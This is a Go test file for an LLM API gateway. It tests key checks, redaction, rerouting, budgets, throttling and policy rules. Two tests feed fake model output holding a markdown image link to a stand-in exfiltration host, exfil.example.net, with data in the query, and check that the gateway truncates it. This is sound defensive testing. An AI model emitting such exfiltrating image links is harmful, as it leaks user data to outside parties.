package gateway

import (
	"context"
	"fmt"
	"math"
	"math/rand/v2"
	"strings"
	"testing"
	"time"

	"github.com/jbouder/stargate/server/internal/demo"
	"github.com/jbouder/stargate/server/internal/fakellm"
	"github.com/jbouder/stargate/server/internal/model"
	"github.com/jbouder/stargate/server/internal/store"
	"github.com/jbouder/stargate/server/internal/traffic"
)

func secret(id string) string {
	for _, k := range demo.Keys {
		if k.ID == id {
			return "Bearer " + demo.DevSecret(k.Prefix)
		}
	}
	panic(id)
}

func chat(m, user string) fakellm.ChatRequest {
	return fakellm.ChatRequest{Model: m, MaxTokens: 200, Messages: []fakellm.Message{{Role: "user", Content: user}}}
}

// fixedUp answers from a script of statuses, one per call, then 200s.
type fixedUp struct {
	statuses []int
	content  string
	calls    []string
}

func (f *fixedUp) Call(_ context.Context, backend string, req fakellm.ChatRequest, onDelta func(string) bool) Result {
	f.calls = append(f.calls, backend+"/"+req.Model)
	st := 200
	if len(f.statuses) > 0 {
		st, f.statuses = f.statuses[0], f.statuses[1:]
	}
	if st != 200 {
		return Result{Status: st, ErrMsg: "overloaded", Duration: 10 * time.Millisecond}
	}
	u := &fakellm.Usage{PromptTokens: 1000, CompletionTokens: 500}
	return Result{Status: 200, Content: f.content, Usage: u, Duration: 300 * time.Millisecond}
}

// demoNow is a fixed clock inside every seeded key's validity, so expiry dates
// in the demo data don't fail tests as the calendar moves on.
var demoNow = time.Date(2026, 9, 28, 12, 0, 0, 0, time.UTC)

func run(t *testing.T, s *Snapshot, in Input, up Upstream) *model.Receipt {
	t.Helper()
	in.Now = demoNow
	d := Admit(s, in, rand.New(rand.NewPCG(1, 2)))
	if d.Reject != nil {
		return d.Finish(s, nil, Result{}, nil, time.Now())
	}
	c, res, failed := Execute(context.Background(), d, up, nil)
	return d.Finish(s, c, res, failed, time.Now())
}

func TestAllowedRequestCostsFromPricing(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hello")}, &fixedUp{content: "hi"})
	if rc.Verdict != "allowed" || rc.Backend != "openai-prod" || rc.Status != 200 {
		t.Fatalf("got %s via %s status %d", rc.Verdict, rc.Backend, rc.Status)
	}
	// 1000 in × $0.25/M + 500 out × $2/M
	if want := 0.00125; rc.CostUSD == nil || *rc.CostUSD < want-1e-9 || *rc.CostUSD > want+1e-9 {
		t.Fatalf("cost %v, want %v", rc.CostUSD, want)
	}
	if rc.CostBasis == nil || rc.CostBasis.Backend != "openai-prod" {
		t.Fatalf("cost basis %+v", rc.CostBasis)
	}
	if len(rc.Trace) != 6 {
		t.Fatalf("trace has %d steps", len(rc.Trace))
	}
}

// WithPrices swaps in fresh rows, grouped per pair and ordered by time, and
// a request is priced at the row in effect when it started.
func TestCostAtTheRequestsTime(t *testing.T) {
	change := time.Date(2026, 10, 1, 12, 0, 0, 0, time.UTC)
	one, two := 1.0, 2.0
	all := func(v *float64) (r [5]*float64) {
		for i := range r {
			r[i] = v
		}
		return r
	}
	base := DemoSnapshot()
	s := base.WithPrices([]store.PriceRow{
		{ModelID: "gpt-5-mini", Backend: "openai-prod", Rates: all(&two), From: change},
		{ModelID: "gpt-5-mini", Backend: "openai-prod", Rates: all(&one), From: change.Add(-time.Hour), To: &change},
	})
	if s == base || len(base.Prices[Pair{"gpt-5-mini", "openai-prod"}]) != 1 {
		t.Fatal("WithPrices changed the snapshot it was called on")
	}
	tok := TokensOf(&model.Receipt{InputTokens: 1_000_000})
	for _, c := range []struct {
		at   time.Time
		want float64
	}{{change.Add(-time.Second), 1}, {change.Add(time.Second), 2}} {
		if got, _ := s.Cost("gpt-5-mini", "openai-prod", c.at, tok); got == nil || *got != c.want {
			t.Errorf("at %s: cost %v, want %v", c.at, got, c.want)
		}
	}
	if got, _ := s.Cost("gpt-5-mini", "openai-prod", change.Add(-2*time.Hour), tok); got != nil {
		t.Errorf("before the first row: cost %v, want none", *got)
	}
}

func TestUnknownKeyHasNoReceipt(t *testing.T) {
	d := Admit(DemoSnapshot(), Input{Secret: "Bearer nope", Req: chat("gpt-5-mini", "x"), Now: time.Now()}, rand.New(rand.NewPCG(1, 2)))
	if d.Reject == nil || d.Reject.Status != 401 || d.Receipt != nil {
		t.Fatalf("want 401 with no receipt, got %+v", d.Reject)
	}
}

func TestModelNotAllowedIsBlocked(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k1"), Req: chat("claude-opus-4-1", "x")}, &fixedUp{})
	if rc.Verdict != "blocked" || rc.ErrorCode != "model_not_allowed" || rc.Status != 403 {
		t.Fatalf("got %s %s %d", rc.Verdict, rc.ErrorCode, rc.Status)
	}
}

func TestSecretBlockedByRule(t *testing.T) {
	up := &fixedUp{}
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k2"), Req: chat("claude-sonnet-5", "key sk-abcdefghijklmnopqrstuvwxyz")}, up)
	if rc.Verdict != "blocked" || rc.ErrorCode != "policy_blocked" || len(up.calls) != 0 {
		t.Fatalf("got %s %s, upstream calls %v", rc.Verdict, rc.ErrorCode, up.calls)
	}
	if last := rc.Rules[len(rc.Rules)-1]; last.RuleID != "r3" || !last.Matched {
		t.Fatalf("last rule eval %+v", last)
	}
}

func TestEmailRedactedBeforeUpstream(t *testing.T) {
	s := DemoSnapshot()
	d := Admit(s, Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "mail a@b.com and c@d.org"), Now: time.Now()}, rand.New(rand.NewPCG(1, 2)))
	if got := d.Req.Messages[0].Content; strings.Contains(got, "@") || !strings.Contains(got, "[EMAIL_2]") {
		t.Fatalf("prompt not redacted: %q", got)
	}
	c, res, failed := Execute(context.Background(), d, &fixedUp{}, nil)
	rc := d.Finish(s, c, res, failed, time.Now())
	if rc.Verdict != "redacted" || rc.Redactions[0] != (model.Redaction{Type: "email", Count: 2}) {
		t.Fatalf("got %s %+v", rc.Verdict, rc.Redactions)
	}
}

func TestSecurityTeamIsNotRedacted(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k6"), Req: chat("llama-3.3-70b", "a@b.com")}, &fixedUp{})
	if rc.Verdict != "allowed" {
		t.Fatalf("got %s", rc.Verdict)
	}
}

func TestEURegionReroutesToPrivate(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k1"), Region: "eu", Req: chat("claude-sonnet-5", "hi")}, &fixedUp{})
	if rc.Verdict != "rerouted" || rc.Backend != "vllm-internal" || rc.ResolvedModel != "llama-3.3-70b" || rc.RouteReason != "policy" {
		t.Fatalf("got %s via %s/%s (%s)", rc.Verdict, rc.Backend, rc.ResolvedModel, rc.RouteReason)
	}
	if !rc.ContentCaptured {
		t.Fatal("vllm-internal captures content")
	}
}

func TestAliasResolves(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k3"), Req: chat("summarize-digest", "hi")}, &fixedUp{})
	if rc.ResolvedModel != "gpt-5-mini" || rc.RouteReason != "alias" || rc.RequestedModel != "summarize-digest" {
		t.Fatalf("got %s (%s)", rc.ResolvedModel, rc.RouteReason)
	}
}

func TestOverloadFallsBack(t *testing.T) {
	up := &fixedUp{statuses: []int{529}}
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k2"), Req: chat("claude-sonnet-5", "hi")}, up)
	if rc.Backend != "bedrock-eu" || rc.FallbackFrom == "" || rc.RouteReason != "fallback" || rc.Status != 200 {
		t.Fatalf("got %s from %q (%s) status %d; calls %v", rc.Backend, rc.FallbackFrom, rc.RouteReason, rc.Status, up.calls)
	}
}

// The claude-opus-4-1 route falls back to openai-prod as gpt-5.5.
func TestOpusFallsBackAsItsRouteSays(t *testing.T) {
	up := &fixedUp{statuses: []int{529}}
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k2"), Req: chat("claude-opus-4-1", "hi")}, up)
	if rc.Backend != "openai-prod" || rc.ResolvedModel != "gpt-5.5" {
		t.Fatalf("got %s/%s; calls %v", rc.Backend, rc.ResolvedModel, up.calls)
	}
}

func TestRateLimitIsNotRetried(t *testing.T) {
	up := &fixedUp{statuses: []int{429}}
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k2"), Req: chat("claude-sonnet-5", "hi")}, up)
	if rc.Status != 429 || rc.ErrorCode != "upstream_rate_limited" || len(up.calls) != 1 || rc.CostUSD == nil || *rc.CostUSD != 0 {
		t.Fatalf("got %d %s cost %v; calls %v", rc.Status, rc.ErrorCode, rc.CostUSD, up.calls)
	}
}

func TestBudgetBlock(t *testing.T) {
	s := DemoSnapshot()
	s.Spend.ByTeam["agents"] = 40_001
	rc := run(t, s, Input{Secret: secret("k2"), Req: chat("claude-sonnet-5", "hi")}, &fixedUp{})
	if rc.Verdict != "blocked" || rc.ErrorCode != "budget_exceeded" {
		t.Fatalf("got %s %s", rc.Verdict, rc.ErrorCode)
	}
}

// roll is a rand source whose every draw is v.
type roll uint64

func (r roll) Uint64() uint64 { return uint64(r) }

func runRoll(t *testing.T, s *Snapshot, in Input, r roll) *model.Receipt {
	t.Helper()
	in.Now = demoNow
	d := Admit(s, in, rand.New(r))
	if d.Reject != nil {
		return d.Finish(s, nil, Result{}, nil, time.Now())
	}
	c, res, failed := Execute(context.Background(), d, &fixedUp{}, nil)
	return d.Finish(s, c, res, failed, time.Now())
}

// Throttle (spec §11 Phase 4): while a throttle budget covering the key is
// over its cap, the key gets ThrottleRate requests in any ThrottleWindow. The
// next is refused with 429 budget_throttled and a Retry-After that says when
// its next slot opens; the receipt says "throttled", not "blocked".
func TestThrottleLimitsEachKeyToARateWhileOverCap(t *testing.T) {
	s := DemoSnapshot()
	s.Spend.ByTeam["support"] = 13_000 // b1 throttles support at $12,000
	th := NewThrottle()
	admit := func(secret string, at time.Duration) *Decision {
		return Admit(s, Input{Secret: secret, Req: chat("gpt-5-mini", "hi"), Now: demoNow.Add(at), Throttle: th}, rand.New(rand.NewPCG(1, 2)))
	}
	for i := range ThrottleRate {
		d := admit(secret("k1"), time.Duration(i)*time.Second)
		if d.Reject != nil {
			t.Fatalf("request %d refused: %+v", i+1, d.Reject)
		}
		if want := fmt.Sprintf("over cap · throttled to %d a minute per key · admitted, %d of %d", ThrottleRate, i+1, ThrottleRate); d.budgetStep.Outcome != want || d.budgetStep.State != "warn" {
			t.Fatalf("request %d budget step %+v", i+1, d.budgetStep)
		}
	}

	// The 11th, 10s in: the first request leaves the window at 60s.
	d := admit(secret("k1"), 10*time.Second)
	if d.Reject == nil || d.Reject.Status != 429 || d.Reject.Code != "budget_throttled" || d.Reject.RetryAfter != 50 {
		t.Fatalf("reject %+v", d.Reject)
	}
	if want := "Team budget support is over its $12000 monthly cap, so each key is throttled to 10 requests a minute. Retry after 50s, or ask a finance admin to raise the cap."; d.Reject.Message != want {
		t.Errorf("message %q", d.Reject.Message)
	}
	rc := d.Finish(s, nil, Result{}, nil, demoNow)
	if rc.Verdict != "throttled" || rc.ErrorCode != "budget_throttled" || rc.Status != 429 {
		t.Fatalf("refused: %s %s %d", rc.Verdict, rc.ErrorCode, rc.Status)
	}
	if b := rc.Trace[1]; b.Outcome != "over cap · throttled to 10 a minute per key · refused, next slot in 50s" || b.State != "throttle" {
		t.Errorf("refused budget step %+v", b)
	}
	if r := rc.Trace[2]; r.Outcome != "not reached" || r.State != "skip" {
		t.Errorf("rules step %+v", r)
	}

	// Each key has its own slots, even under the same team budget.
	other := &store.KeyRecord{APIKey: model.APIKey{ID: "k9", Name: "support-batch", Team: "support", Project: "helpdesk",
		ProjectID: demo.ProjectID(demo.Tenant, "support", "helpdesk"), AllowedModels: []string{"gpt-5-mini"}, Status: "active"}, Hash: "h-k9"}
	s.KeyBy[other.Hash] = other
	if d := AdmitKey(s, other, Input{Req: chat("gpt-5-mini", "hi"), Now: demoNow.Add(10 * time.Second), Throttle: th}, rand.New(rand.NewPCG(1, 2))); d.Reject != nil {
		t.Fatalf("another key refused: %+v", d.Reject)
	}

	// A slot opens as the oldest request leaves the window.
	if d := admit(secret("k1"), 60*time.Second); d.Reject != nil {
		t.Fatalf("at 60s: %+v", d.Reject)
	}
	if d := admit(secret("k1"), 60*time.Second+500*time.Millisecond); d.Reject == nil || d.Reject.RetryAfter != 1 {
		t.Fatalf("Retry-After rounds up to whole seconds: %+v", d.Reject)
	}

	// Under the cap nothing is limited.
	s.Spend.ByTeam["support"] = 100
	for i := range 2 * ThrottleRate {
		if d := admit(secret("k1"), 61*time.Second); d.Reject != nil || d.budgetStep.Outcome != "within cap" {
			t.Fatalf("under the cap, request %d: %+v %+v", i+1, d.Reject, d.budgetStep)
		}
	}
}

// The throttle's window slides: a request leaves it a window after it was
// admitted. Refused requests don't take a slot.
func TestThrottleTake(t *testing.T) {
	th := NewThrottle()
	for i := range ThrottleRate {
		if ok, used, _ := th.Take("k", demoNow.Add(time.Duration(i)*time.Millisecond)); !ok || used != i+1 {
			t.Fatalf("take %d: ok %v used %d", i+1, ok, used)
		}
	}
	for range 3 {
		if ok, _, wait := th.Take("k", demoNow.Add(time.Second)); ok || wait != ThrottleWindow-time.Second {
			t.Fatalf("over the rate: ok %v wait %v", ok, wait)
		}
	}
	if ok, used, _ := th.Take("k", demoNow.Add(ThrottleWindow+time.Hour)); !ok || used != 1 {
		t.Fatalf("after the window: ok %v used %d", ok, used)
	}
	// A nil throttle has no memory: every request is a first one.
	var none *Throttle
	if ok, used, _ := none.Take("k", demoNow); !ok || used != 1 {
		t.Fatalf("nil: ok %v used %d", ok, used)
	}
}

func TestBlockStillRefusesEverything(t *testing.T) {
	s := DemoSnapshot()
	s.Spend.ByTeam["agents"] = 40_000 // b2 blocks from exactly its cap
	if rc := runRoll(t, s, Input{Secret: secret("k2"), Req: chat("claude-sonnet-5", "hi")}, roll(math.MaxUint64)); rc.ErrorCode != "budget_exceeded" {
		t.Fatalf("got %s %s", rc.Verdict, rc.ErrorCode)
	}
}

// withProjectBudget adds a project budget no key points at: budgets apply by
// scope, not by the key's budget_id. A project budget names the project's id.
func withProjectBudget(s *Snapshot, team, project, onExceed string, cap float64) {
	s.Budgets["bp"] = model.Budget{ID: "bp", Scope: demo.ProjectID(demo.Tenant, team, project), ScopeType: "project", Period: "monthly", CapUSD: cap, OnExceed: onExceed}
}

func TestProjectBudgetBlocks(t *testing.T) {
	s := DemoSnapshot()
	withProjectBudget(s, "support", "helpdesk", "block", 500)
	// Project spend is every key in it, revoked ones included, as /budgets counts it.
	other := &store.KeyRecord{APIKey: model.APIKey{ID: "k8", Name: "helpdesk-old", Team: "support", Project: "helpdesk",
		ProjectID: demo.ProjectID(demo.Tenant, "support", "helpdesk"), Status: "revoked"}, Hash: "h-k8"}
	s.KeyBy[other.Hash] = other
	// Another team's project of the same name is another project.
	elsewhere := &store.KeyRecord{APIKey: model.APIKey{ID: "k9", Name: "web-helpdesk", Team: "web", Project: "helpdesk",
		ProjectID: demo.ProjectID(demo.Tenant, "web", "helpdesk"), Status: "active"}, Hash: "h-k9"}
	s.KeyBy[elsewhere.Hash] = elsewhere
	s.Spend.ByKey["k9"] = 10_000
	s.Spend.ByKey["k1"], s.Spend.ByKey["k8"] = 300, 300
	rc := run(t, s, Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{})
	if rc.Verdict != "blocked" || rc.Status != 429 || rc.ErrorCode != "budget_exceeded" {
		t.Fatalf("got %s %s %d", rc.Verdict, rc.ErrorCode, rc.Status)
	}
	if want := "Project budget helpdesk is over its $500 monthly cap. Ask a finance admin to raise it."; rc.ErrorDetail != want {
		t.Errorf("detail %q", rc.ErrorDetail)
	}
	b := rc.Trace[1]
	if b.Input != "project budget helpdesk · $600 of $500" || b.Outcome != "over cap · blocked" || b.State != "fail" {
		t.Errorf("budget step %+v", b)
	}
	if rc.Trace[2].Outcome != "not reached" {
		t.Errorf("rules step %+v", rc.Trace[2])
	}
}

func TestProjectSpendCountsRotatingKeyOnce(t *testing.T) {
	s := DemoSnapshot()
	withProjectBudget(s, "web", "assistant", "block", 1_000)
	for _, k := range s.KeyBy {
		if k.ID == "k4" {
			k.NextHash = "h-k4-next"
			s.KeyBy[k.NextHash] = k
			break
		}
	}
	s.Spend.ByKey["k4"] = 600
	rc := run(t, s, Input{Secret: secret("k4"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{})
	if rc.Verdict != "allowed" {
		t.Fatalf("got %s %s: %+v", rc.Verdict, rc.ErrorCode, rc.Trace[1])
	}
}

func TestTeamBudgetCoversKeyWithoutBudget(t *testing.T) {
	s := DemoSnapshot()
	s.Spend.ByTeam["research"] = 25_000 // b5 warns at $20,000; k5 has no budget_id
	rc := run(t, s, Input{Secret: secret("k5"), Req: chat("claude-sonnet-5", "hi")}, &fixedUp{})
	if rc.Verdict != "allowed" || rc.Trace[1].State != "warn" || rc.Trace[1].Input != "team budget research · $25000 of $20000" {
		t.Fatalf("got %s, budget step %+v", rc.Verdict, rc.Trace[1])
	}
}

func TestStrictestOverCapBudgetWins(t *testing.T) {
	for i := 0; i < 20; i++ { // budgets are a map; the verdict mustn't depend on its order
		s := DemoSnapshot()
		s.Spend.ByTeam["support"] = 13_000 // b1: throttle
		withProjectBudget(s, "support", "helpdesk", "block", 500)
		s.Spend.ByKey["k1"] = 13_000
		rc := run(t, s, Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{})
		if rc.Verdict != "blocked" || !strings.HasPrefix(rc.ErrorDetail, "Project budget helpdesk") {
			t.Fatalf("got %s %q", rc.Verdict, rc.ErrorDetail)
		}
	}
}

// A key budget names the key's id; traces and messages show its name.
func TestKeyBudgetMatchesByID(t *testing.T) {
	s := DemoSnapshot()
	s.Budgets["bk"] = model.Budget{ID: "bk", Scope: "k1", ScopeType: "key", Period: "monthly", CapUSD: 100, OnExceed: "block"}
	s.Spend.ByKey["k1"] = 150
	rc := run(t, s, Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{})
	if rc.ErrorCode != "budget_exceeded" || rc.Trace[1].Input != "key budget support-bot · $150 of $100" {
		t.Fatalf("got %s, budget step %+v", rc.ErrorCode, rc.Trace[1])
	}
	// A scope holding the key's name, as key budgets did before, covers nothing.
	s.Budgets["bk"] = model.Budget{ID: "bk", Scope: "support-bot", ScopeType: "key", Period: "monthly", CapUSD: 100, OnExceed: "block"}
	if rc = run(t, s, Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{}); rc.Verdict == "blocked" {
		t.Fatalf("a key name matched: %s", rc.ErrorDetail)
	}
}

func TestSmallBudgetShowsCents(t *testing.T) {
	s := DemoSnapshot()
	b := s.Budgets["b3"] // batch-summarize's key budget
	b.CapUSD, b.OnExceed = 0.05, "block"
	s.Budgets["b3"] = b
	s.Spend.ByKey["k3"] = 0.061
	rc := run(t, s, Input{Secret: secret("k3"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{})
	if rc.Trace[1].Input != "key budget batch-summarize · $0.06 of $0.05" || rc.ErrorDetail != "Key budget batch-summarize is over its $0.05 monthly cap. Ask a finance admin to raise it." {
		t.Fatalf("budget step %+v, detail %q", rc.Trace[1], rc.ErrorDetail)
	}
}

func TestDisabledRuleIsSkipped(t *testing.T) {
	s := DemoSnapshot()
	for i := range s.Rules {
		if s.Rules[i].Name == "block-src" {
			s.Rules[i].Mode = "disabled"
		}
	}
	rc := run(t, s, Input{Secret: secret("k2"), Req: chat("claude-sonnet-5", "key sk-abcdefghijklmnopqrstuvwxyz")}, &fixedUp{})
	if rc.Verdict == "blocked" {
		t.Fatalf("a disabled rule blocked: %s", rc.ErrorDetail)
	}
	for _, ev := range rc.Rules {
		if ev.Name == "block-src" {
			t.Fatalf("a disabled rule was evaluated: %+v", ev)
		}
	}
}

func TestBlockWithoutEntityNamesTheRule(t *testing.T) {
	s := DemoSnapshot()
	s.Rules = append(s.Rules, model.PolicyRule{ID: "r9", Ordinal: 9, Name: "no-web", Mode: "enforce", FailMode: "closed", Version: 1,
		When: []model.Cond{{Field: "team", Op: "is", Value: []string{"web"}}}, Then: []model.Action{{Action: "block"}}})
	rc := run(t, s, Input{Secret: secret("k4"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{})
	if rc.ErrorCode != "policy_blocked" || rc.ErrorDetail != "Rule no-web v1 blocks this request." || rc.Trace[2].Outcome != "blocked by no-web v1" {
		t.Fatalf("got %s %q, rules step %+v", rc.ErrorCode, rc.ErrorDetail, rc.Trace[2])
	}
}

func TestExfilTruncates(t *testing.T) {
	rc := run(t, DemoSnapshot(), Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")},
		&fixedUp{content: "fine text ![x](https://exfil.example.net/c?d=secret) more"})
	if rc.Verdict != "truncated" || rc.InboundVerdict != "blocked" {
		t.Fatalf("got %s/%s", rc.Verdict, rc.InboundVerdict)
	}
}

func TestInspectorCutsStreamAcrossChunks(t *testing.T) {
	in := &Inspector{}
	var sent strings.Builder
	for _, c := range []string{"hello ![x](https://ex", "fil.example.net/c?d=1)", " after"} {
		keep, ok := in.Feed(c)
		sent.WriteString(keep)
		if !ok {
			break
		}
	}
	if !in.Cut || strings.Contains(in.Content(), "d=1") {
		t.Fatalf("cut=%v content=%q", in.Cut, in.Content())
	}
}

// The generated mix should land near the mockup's verdict shares.
func TestGeneratedMixProducesEveryVerdict(t *testing.T) {
	s := DemoSnapshot()
	r := rand.New(rand.NewPCG(7, 8))
	gen := traffic.New()
	up := &SimUpstream{Rand: r}
	counts := map[string]int{}
	const n = 5000
	for i := 0; i < n; i++ {
		req := gen.Next(r)
		d := Admit(s, Input{Secret: req.Secret, Region: req.Region, Req: req.Body, Now: demoNow}, r)
		var rc *model.Receipt
		if d.Reject != nil {
			rc = d.Finish(s, nil, Result{}, nil, time.Now())
		} else {
			c, res, failed := Execute(context.Background(), d, up, func(string) bool { return true })
			rc = d.Finish(s, c, res, failed, time.Now())
		}
		counts[rc.Verdict]++
	}
	for _, v := range []string{"allowed", "redacted", "rerouted", "blocked", "truncated"} {
		if counts[v] == 0 {
			t.Errorf("no %s receipts in %d: %v", v, n, counts)
		}
	}
	if share := float64(counts["allowed"]) / n; share < 0.7 || share > 0.9 {
		t.Errorf("allowed share %.2f outside 0.7–0.9: %v", share, counts)
	}
	t.Logf("verdicts: %v", counts)
}

// A "project is" condition names projects by id (§5.1): another team's
// project with the same name doesn't match, and a rename keeps matching.
func TestProjectConditionMatchesByID(t *testing.T) {
	s := DemoSnapshot()
	helpdesk := demo.ProjectID(demo.Tenant, "support", "helpdesk")
	s.Rules = []model.PolicyRule{{ID: "rp", Name: "helpdesk-block", Version: 1, Mode: "enforce", FailMode: "open",
		When: []model.Cond{{Field: "project", Op: "is", Value: []string{helpdesk}}}, Then: []model.Action{{Action: "block"}}}}
	if rc := run(t, s, Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{}); rc.ErrorCode != "policy_blocked" {
		t.Fatalf("by id: %s %s", rc.Verdict, rc.ErrorCode)
	}
	s.KeyByID("k1").Project = "Help desk"
	if rc := run(t, s, Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{}); rc.ErrorCode != "policy_blocked" {
		t.Fatalf("after a rename: %s %s", rc.Verdict, rc.ErrorCode)
	}
	// Another team's key in a project of the same name isn't in it.
	other := &store.KeyRecord{APIKey: model.APIKey{ID: "k9", Name: "web-helpdesk", Team: "web", Project: "helpdesk",
		ProjectID: demo.ProjectID(demo.Tenant, "web", "helpdesk"), AllowedModels: []string{"gpt-5-mini"}, Status: "active"}, Hash: "h-k9"}
	if d := AdmitKey(s, other, Input{Req: chat("gpt-5-mini", "hi"), Now: demoNow}, rand.New(rand.NewPCG(1, 2))); d.Reject != nil {
		t.Fatalf("same name, other team: %+v", d.Reject)
	}
	// A project's name isn't its id.
	s.Rules[0].When[0].Value = []string{"Help desk"}
	if rc := run(t, s, Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{}); rc.Verdict == "blocked" {
		t.Fatalf("a name matched: %s", rc.ErrorDetail)
	}
}

// Receipts carry the key's project id (§5.1).
func TestReceiptCarriesTheProjectID(t *testing.T) {
	s := DemoSnapshot()
	rc := run(t, s, Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{})
	if want := demo.ProjectID(demo.Tenant, "support", "helpdesk"); rc.ProjectID != want || rc.Project != "helpdesk" {
		t.Fatalf("project %q %q, want %q", rc.ProjectID, rc.Project, want)
	}
}
